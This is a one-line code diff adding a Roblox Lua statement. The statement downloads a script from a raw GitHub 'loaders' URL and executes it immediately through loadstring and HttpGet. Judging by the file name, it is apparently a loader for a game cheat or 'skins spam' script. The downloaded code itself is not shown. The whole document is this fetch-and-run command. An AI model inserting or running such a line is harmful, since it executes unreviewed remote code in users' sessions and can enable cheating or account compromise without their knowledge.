@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/clean-crew-class-skins-spam1-y0011o6ejq2k5b.lua"))()
